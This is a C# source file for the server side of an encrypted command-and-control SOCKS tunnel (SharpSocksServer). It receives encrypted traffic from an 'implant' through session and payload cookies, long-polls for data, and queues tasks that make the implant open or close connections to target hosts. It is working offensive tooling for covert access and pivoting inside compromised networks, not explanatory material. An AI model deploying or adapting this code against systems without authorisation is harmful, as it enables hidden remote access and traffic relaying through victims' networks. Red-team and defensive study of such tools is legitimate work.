using Common.Classes.Encryption;
using Common.Server.Interfaces;
using SocksServer.Classes.Server;
using SocksTunnel.Constants;
using SocksTunnel.Interfaces;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using System.Xml.XPath;
using SharpSocksServer.ImplantCommsHTTPServer.Interfaces;
using SharpSocksServer.Source.UI.Classes;
using SharpSocksServer.Source.ImplantCommsHTTPServer.Classes;
using System.Collections.Concurrent;

namespace SocksTunnel.Classes
{

    public class EncryptedC2RequestProcessor : IProcessRequest, ISocksImplantComms
    {
        public ILogOutput ServerComms { get; set; }
        public IEncryptionHelper _encryption { get; set; }
        public ManualResetEvent CmdChannelRunningEvent { get; set; }

        TimeSpan COMMANDCHANNELTIMEOUT = new TimeSpan(0, 2, 0);
		int _longpolltimeout = 30;
		public int LongPollTimeout {get{ return _longpolltimeout;} 
			set { 
				_longpolltimeout = value;
				if (ServerComms.IsVerboseOn())
					ServerComms.LogMessage($"HTTP Long Poll timeout is {value} s");
			} 
		}
        public String PayloadCookieName { get; set; }
        String _sessionIdName;
        String _commandChannel;
        DateTime? _lastTimeCommandChannelSeen;
        Dictionary<String, ConnectionDetails> mapSessionToConnectionDetails = new Dictionary<string, ConnectionDetails>();
		AutoResetEvent _cmdTaskWaitEvent = new AutoResetEvent(false);
        ConcurrentDictionary<String, Listener> _listeners = new ConcurrentDictionary<String, Listener>();
        ConcurrentQueue<XElement> _commandTasks = new ConcurrentQueue<XElement>();
        ConcurrentDictionary<String, DataTask> _dataTasks = new ConcurrentDictionary<String, DataTask>();
		static byte[] _standardResponse = null;
		public ushort CommandLimit { get; set; }

		static EncryptedC2RequestProcessor()
		{
			_standardResponse = UTF8Encoding.UTF8.GetBytes(new XElement("Response", new XElement("Success", 0)).ToString());
		}

		public EncryptedC2RequestProcessor(IEncryptionHelper encryption, String sessionCookieName, String commandChannel, ushort commandLimit = 5)
        {
            CmdChannelRunningEvent = new ManualResetEvent(false);
            _encryption = encryption;
            _sessionIdName = sessionCookieName;
            _commandChannel = commandChannel;
            CommandLimit = commandLimit;

            mapSessionToConnectionDetails.Add(commandChannel, new ConnectionDetails()
            {
                TargetId = "CommandChannel",
                HostPort = "",
                Status = (IsCommandChannelConnected) ? "Connected" : "Closed",
                UpdateTime = "Never",
                DataSent = 0, 
                DataRecv = 0
            });
        }
        
        public ConnectionDetails CommandChannelConnectionDetails
        {
            get
            {
                return mapSessionToConnectionDetails[_commandChannel];
            }
        }

        public bool IsCommandChannelConnected
        {
            get
            {
                if (_lastTimeCommandChannelSeen.HasValue)
                    if (DateTime.Now.Subtract(_lastTimeCommandChannelSeen.Value) < COMMANDCHANNELTIMEOUT)
                        return true;
                CmdChannelRunningEvent.Reset();
                return false;
            }
        }

        public void ProcessRequest(System.Net.HttpListenerContext ctx)
        {
            System.Net.Cookie sessionCookie = null;
            try
            {
                sessionCookie = ctx.Request.Cookies[_sessionIdName];
                if (String.IsNullOrEmpty(sessionCookie?.Value))
                {
                    ctx.Response.StatusCode = 401;
                    ctx.Response.Close();
                    return;
                }
            }
            catch(Exception ex)
            {
                ServerComms.LogMessage($"ERROR Processing session cookie {ex.Message}");
            }

            String decryptedSessionId = null, decryptedStatus = null;
            try
            {
                var decr = _encryption.Decrypt(sessionCookie.Value);
                if (decr == null)
                    throw new Exception($"Can't decrypt session cookie{sessionCookie.Value}");
                var decryptedSessionStatus = UTF8Encoding.UTF8.GetString(decr.ToArray()).Split(':');
                decryptedSessionId = decryptedSessionStatus[0];
                decryptedStatus = decryptedSessionStatus[1];
				Console.WriteLine($"{decryptedSessionStatus[0]} {decryptedSessionStatus[1]}");

				if (String.IsNullOrWhiteSpace(decryptedSessionId))
                    throw new Exception($"Session cookie decrypted to nothing or whitespace");
            }
            catch (Exception ex)
            {
                ServerComms.LogError($"Error occured communicating with implant {ex.Message}");
                ctx.Response.StatusCode = 500;
                ctx.Response.Close();
                return;
            }
            List<byte> responseBytes = new List<byte>();
            String uploadedPayload = null;

            try
            {
                if ("POST" == ctx.Request.HttpMethod)
                {
                    //Yeah casting ContentLength64 to an int is not idle, but we should not be uploading anywhere near 2gb+ in one request!!!!!
                    uploadedPayload = (new StreamReader(ctx.Request.InputStream)).ReadToEnd();
                }
                else
                if ("GET" == ctx.Request.HttpMethod)
                {
                    var payloadCookie = ctx.Request.Cookies[PayloadCookieName];
                    //TO DO: Dodgy as hell. Need to make sure this can be tampered/malleable etc 
                    //This could be whenever in the request. Need to sort that out
                    if (!String.IsNullOrWhiteSpace(payloadCookie?.Value))
						uploadedPayload = payloadCookie.Value;
                    
                }
            }
            catch(Exception ex)
            {
                ServerComms.LogMessage($"ERROR Processing payload data {decryptedSessionId} {ex.Message}");
            }
			ConnectionDetails dtls = null;
			if (decryptedSessionId == _commandChannel)
            {
                try
                {
					ProcessCommandChannelTime();

					if (String.IsNullOrWhiteSpace(uploadedPayload))
						ServerComms.LogMessage($"Command channel sending {_commandTasks.Count()} tasks ");
					else
					{
						mapSessionToConnectionDetails[_commandChannel].DataRecv += uploadedPayload.Count();
						if (_commandTasks.Count() > 0)
							ServerComms.LogMessage($"Command channel payload {uploadedPayload.Count()} bytes, sending {_commandTasks.Count()} tasks ");
						ProcessCommandChanelImplantMessage(this._encryption.Decrypt(uploadedPayload));
					}
					var timeout = false;
					if (_commandTasks.Count() == 0)
						timeout = _cmdTaskWaitEvent.WaitOne(40000);
					if (timeout)
						//if something got queued just wait 300 milliseconds longer
						//to see if other stuff got queued
						_cmdTaskWaitEvent.WaitOne(300);

					if (_commandTasks.Count() > 0)
						responseBytes.AddRange(UTF8Encoding.UTF8.GetBytes(new XElement("Response", new XElement("Tasks", PopQueueCommandTasks())).ToString()));
					else
						responseBytes.AddRange(_standardResponse);

					mapSessionToConnectionDetails[_commandChannel].DataSent += responseBytes.Count();
                }
                catch(Exception ex)
                {
                    ServerComms.LogMessage($"ERROR Processing command channel message {ex.Message}");
                }
            }
            else
            {
				var asyncMesg = false;
                try
                {
					if (decryptedStatus == "closed")
                    {
                        ServerComms.LogMessage($"Close connection has been called on {decryptedSessionId}");
                        //Implant has called time
                        //cleanup the data queue

                        if (_dataTasks.ContainsKey(decryptedSessionId))
						{
							_dataTasks[decryptedSessionId].Tasks.Clear();
							var wait = _dataTasks[decryptedSessionId].Wait;
							_dataTasks[decryptedSessionId].DisposeWait();
							_dataTasks.TryRemove(decryptedSessionId, out DataTask value);
						}

                        _listeners.TryRemove(decryptedSessionId, out Listener lstnr);
                        
                        //Let the socks know its over
                        SocksProxy.ImplantCalledClose(decryptedSessionId);
                        ctx.Response.StatusCode = 200;
                        ctx.Response.OutputStream.Close();
                        return;
                    }
                    else if (SocksProxy.IsValidSession(decryptedSessionId))
                    {
						if (!SocksProxy.IsSessionOpen(decryptedSessionId))
							SocksProxy.NotifyConnection(decryptedSessionId, "open");

						dtls = SocksProxy.GetDetailsForTargetId(decryptedSessionId);
						if (null == uploadedPayload || uploadedPayload.Count() == 0)
                        {
                            if (ServerComms.IsVerboseOn())
                                ServerComms.LogMessage($"Requesting data for connection {dtls.HostPort}:{dtls.Id}");
                        }
                        else
                        {
                            SocksProxy.ReturnDataCallback(decryptedSessionId, this._encryption.Decrypt(uploadedPayload));
							ServerComms.LogMessage($"[Rx] {dtls.HostPort}:{dtls.Id} {uploadedPayload.Count()} bytes ");
							if ("asyncUpload" == decryptedStatus)
								asyncMesg = true;
						}
                    }
                    else
                    {
                        if (ServerComms.IsVerboseOn())
							ServerComms.LogMessage($"Session ID {decryptedSessionId} is not valid");
						try 
						{ 
							ctx.Response.StatusCode = 404;
							ctx.Response.OutputStream.Close();
						}
						catch (Exception ex)
						{
							ServerComms.LogMessage($"ERROR Writing response back 404 to client {ex.Message}");
						}
						return;
                    }

                    var dataQueue = _dataTasks[decryptedSessionId];
					var ready = false;

					if (!asyncMesg)
						ready = dataQueue.Wait.WaitOne(_longpolltimeout * 1000);

					while(dataQueue.Tasks.Count > 0)
						if (dataQueue.Tasks.TryDequeue(out List<byte> resp))
							responseBytes.AddRange(resp);

					if (responseBytes.Count > 0)
						ServerComms.LogMessage($"[Tx] {dtls.HostPort}:{dtls.Id} {responseBytes.Count()} bytes ");
					else
						ServerComms.LogMessage($"[Tx] {dtls.HostPort}:{dtls.Id} nothing to send. TimedOut: {!ready}");
				}
                catch(Exception ex)
                {
                    ServerComms.LogMessage($"ERROR Processing response for connection {decryptedSessionId} {ex.Message}");
                }   
            }

            try
            {
                ctx.Response.StatusCode = 200;
				
				var payload = EncryptPayload(responseBytes);
                if (null != payload && payload.Count > 0)
                    ctx.Response.OutputStream.Write(payload.ToArray(), 0, payload.Count());

				ctx.Response.OutputStream.Close();
            }
            catch (Exception ex)
            {
                ServerComms.LogMessage($"ERROR Writing response back to client {ex.Message}");
            }
        }

        void ProcessCommandChanelImplantMessage(List<byte> message)
        {
            var xdoc = XDocument.Parse(UTF8Encoding.UTF8.GetString(message.ToArray()));

            var elms = xdoc.XPathSelectElements("CommandChannel/ListenerStatus");
            xdoc.XPathSelectElements("CommandChannel/ListenerStatus").ToList().ForEach(x =>
            {
                var nodeStatus = x.XPathSelectElement("Status");
                if (nodeStatus != null)
                {
                    var sessionId = nodeStatus.Attribute("SessionID").Value;
                    var status = nodeStatus.Value;
                    SocksProxy.NotifyConnection(sessionId, status);
                    ServerComms.LogMessage($"Status: connection {nodeStatus.Attribute("SessionID").Value} - {nodeStatus.Value}");
                }
            });
        }
        
        List<byte> EncryptPayload(List<byte> responseBytes)
        {
            List<byte> payload = null;
            if (null != responseBytes && responseBytes.Count > 0)
                payload = UTF8Encoding.UTF8.GetBytes(_encryption.Encrypt(responseBytes)).ToList();
            return payload;
        }

        void AddListener(String targetId, Listener listenerInst)
        {
            _listeners.TryAdd(targetId, listenerInst);
        }

        public bool IsListenerConnected(String sessionId)
        {
            bool connected = false;
            if (!_listeners.ContainsKey(sessionId))
				return false;

            connected = (_listeners[sessionId].Status == ListenerStatus.Connected);
            
            return connected;
        }

        public String CreateNewConnectionTarget(String targetHost, ushort targetPort)
        {
            var listenerGuid = Guid.NewGuid().ToString();

            var createListenerRequest = new XElement("Task",
                                new XElement("CreateListener",
                                    new XAttribute("TargetHost", targetHost.ToString()),
                                    new XAttribute("TargetPort", targetPort),
                                    new XAttribute("SessionID", listenerGuid.ToString())));

            var listener = new Listener(targetHost, targetPort);

            AddListener(listenerGuid, listener);
            _dataTasks.TryAdd(listenerGuid, new DataTask());
            
			QueueCommandTask(createListenerRequest);

            return listenerGuid.ToString();
        }

        public void CloseAllConnections()
        {
            _listeners.Keys.ToList().ForEach(targetid =>
           {
               CloseTargetConnection(targetid);
           });
        }

        public bool CloseTargetConnection(String listenerGuid)
        {
            lock(_listeners)
            {
                if (!_listeners.ContainsKey(listenerGuid))
                    return false;

                _listeners[listenerGuid].Status = ListenerStatus.Closing;
            }
            
            var response = new XElement("Task",
                            new XElement("CloseListener",
                                new XAttribute("SessionID", listenerGuid.ToString())));

            QueueCommandTask(response);
            return true;
        }

        public bool SendDataToTarget(String listenerGuid, List<byte> payload)
        {
            if (!_dataTasks.ContainsKey(listenerGuid))
                    return false;
			var dtaTasks = _dataTasks[listenerGuid];

			dtaTasks.Tasks.Enqueue(payload);
			dtaTasks.Wait.Set();
			return true;
        }

        bool QueueCommandTask(XElement task)
        {
            if (!IsCommandChannelConnected)
				return false;

            _commandTasks.Enqueue(task);
			_cmdTaskWaitEvent.Set();
			return true;
        }

		List<XElement> PopQueueCommandTasks()
        {
			var elems = new List<XElement>();
			while (_commandTasks.Count > 0 && elems.Count < CommandLimit)
				if (_commandTasks.TryDequeue(out XElement xel) && null != xel)
					elems.Add(xel);
			return elems;
		}

        void ProcessCommandChannelTime()
        {
            if (!_lastTimeCommandChannelSeen.HasValue)
            {
                if (!_lastTimeCommandChannelSeen.HasValue)
                {
                    CmdChannelRunningEvent.Set();
                    mapSessionToConnectionDetails[_commandChannel].UpdateTime = (this._lastTimeCommandChannelSeen = DateTime.Now).ToString();
                }
            }
            else
                mapSessionToConnectionDetails[_commandChannel].UpdateTime = (this._lastTimeCommandChannelSeen = DateTime.Now).ToString();
        }
    }
}
